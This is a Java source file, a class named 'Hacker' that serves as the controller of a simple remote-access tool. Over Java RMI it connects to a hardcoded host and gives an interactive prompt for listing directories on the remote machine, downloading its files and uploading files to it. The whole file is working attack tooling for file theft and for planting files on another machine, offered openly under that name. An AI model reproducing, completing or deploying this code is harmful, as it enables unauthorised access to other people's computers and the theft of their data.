import java.rmi.*;
import java.util.*;
import javax.swing.*;
import java.io.*;
public class Hacker
{
	public static void main(String ae[])throws Exception
	{
		Ddd v=(Ddd)Naming.lookup("rmi://192.168.43.101:45678/demo");
		String cwd="c:/";
		System.out.print(cwd+"> ");
		Scanner in=new Scanner(System.in);
		String command,C[];
		do
		{
			command=in.nextLine();
			C=command.split(" ",2);
			switch(C[0])
			{
				case "":  System.out.print(cwd+"> ");break;
				case "cd" : if(v.check(command.substring(command.indexOf(" ")+1)))cwd=command.substring(command.indexOf(" ")+1);
						    
						    if(!v.check(command.substring(command.indexOf(" ")+1)))
						    	System.out.println("no such path");
						    System.out.print(cwd+"> ");
							         break;
				case "dir": String A[]=v.listing(cwd);
							  for(String list:A)
							  {
							  	System.out.println("\t"+list);
							  }System.out.print(cwd+"> ");
							  break;
			  case "download": ArrayList<Integer> AA=v.downloadd(C[1]);
			  					if(AA==null){System.out.println("no such file on remote machine");System.out.print(cwd+"> ");break;}
			  					try
			  					{
			  						FileOutputStream fout=new FileOutputStream(C[1].substring(C[1].indexOf("\\")+1));
			  						for(Integer value: AA)
			  					{
			  						fout.write(value);
			  					}

			  					System.out.print("File Downloaded\n"+cwd+"> ");
			  					fout.close();


			  					}catch(FileNotFoundException e){System.out.print(cwd+">exception ");}break;
			  					
			  	case "upload" : ArrayList<Integer> B=new ArrayList();
			  						int gg;
			  					try
			  					{
			  						FileInputStream fin=new FileInputStream(C[1]);
			  						while(true)
			  						{
			  							gg=fin.read();
			  							if(gg!=-1)B.add(gg);
			  							else break;
			  						}
			  						fin.close();
			  						if(v.uploadd(B,C[1].substring(C[1].indexOf("\\")+1))){System.out.println("File Uploaded");}
			  						else System.out.println("File not Uploaded");
			  						
			  					}catch(FileNotFoundException e){System.out.println("no such file on your disk in specified path");}
			  					System.out.print(cwd+"> ");break;
			 	case "-h":         System.out.println("\t cd <path>                              : To change directory");
			 						System.out.print("\t dir                                    : To list all the content of current directory\n\t download <File Path on remote machine> : To download a File from remote machine\n\t upload <File path on your machine>     : to send a file to remote machine\n"+cwd+"> ");break;
			  default :  System.out.println("No Such Command -h for help");System.out.print(cwd+"> ");

			}

		}while(!command.equals("exit"));



	}
}